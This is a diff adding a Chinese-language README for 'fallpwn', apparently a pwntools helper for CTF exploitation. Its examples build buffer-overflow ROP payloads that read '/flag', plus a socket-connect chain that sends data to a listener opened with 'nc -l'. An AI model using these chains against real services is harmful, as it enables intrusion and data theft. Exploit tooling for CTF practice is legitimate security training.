@@ -1,0 +1,104 @@
+[toc]
+
+# fallpwn
+
+## 安装
+
+依赖：
+
+```tex
+pwntools
+```
+
+使用`pip`即可
+
+```bash
+pip install fallpwn
+```
+
+## 使用
+
+### 获得gadgets
+
+只需要传入`libc`的`ELF`对象，即可直接获得常用`gagdet`地址
+
+```python
+libc.address = libc_base # 使用前先设置libc基地址
+finder = GadgetsFinder(libc) # 传入libc的elf对象
+
+gadgets = finder.get_gadgets() # 获得gadgets字典，可以像正常字典一样使用
+pop_rdi_ret = gadgets['pop_rdi']
+leave_ret = gadgets['leave_ret']
+```
+
+### 生成常用ROP payload
+
+> syscall
+
+生成指定`syscall`的`payload`：
+
+```python
+payload = b'a'*0x18
+payload += rop.syscall(0, 0, elf.bss()+0x400, 0x8)
+payload += rop.syscall(1, 1, elf.bss()+0x400, 0x8)
+
+sh.send(payload)
+sh.send('/flag\x00')
+
+sh.interactive()
+```
+
+> orw
+
+可以生成`orw`的`payload`：
+
+```python
+# 定义对象
+finder = GadgetsFinder(libc)
+rop = RopPayload(libc)
+# 获得字典
+gadgets = finder.get_gadgets()
+pop_rdi = gadgets['pop_rdi']
+
+# 生成orw payload
+payload = b'a'*0x18
+payload += rop.read(libc.address-0x100, 0x10)
+payload += rop.ropchain(libc.address-0x100)
+
+sh.send(payload)
+sh.send('/flag\x00')
+
+sh.interactive()
+```
+
+此外，`rop.ropchain()`还有多种参数，例如`open`可选`openat`，`orw`可选`sendfile`等。
+
+> socket + connect +write
+
+可以生成将数据发送到远程监听处，以及生成所需的`socket_address`的`payload`：
+
+```python
+# 定义对象
+finder = GadgetsFinder(libc)
+rop = RopPayload(libc)
+# 获得字典
+gadgets = finder.get_gadgets()
+
+# 发送数据到远程
+payload = b'a'*0x18
+payload += rop.read(libc.address-0x100, 0x10) # 发送connect所需payload
+payload += rop.reverse_shell(libc.address-0x100) # socket + connect
+payload += rop.write(gadgets['/bin/sh'], fd=3) # 使用write发送数据
+
+sh.send(payload)
+sh.send(rop.get_sockaddr_payload(ip='127.0.0.7', port=9999)) # 发送connect所需payload
+sh.interactive()
+```
+
+在指定`ip`的服务器进行监听即可：
+
+```bash
+nc -l -vv 9999
+# 或nc -l -p 9999
+```
+
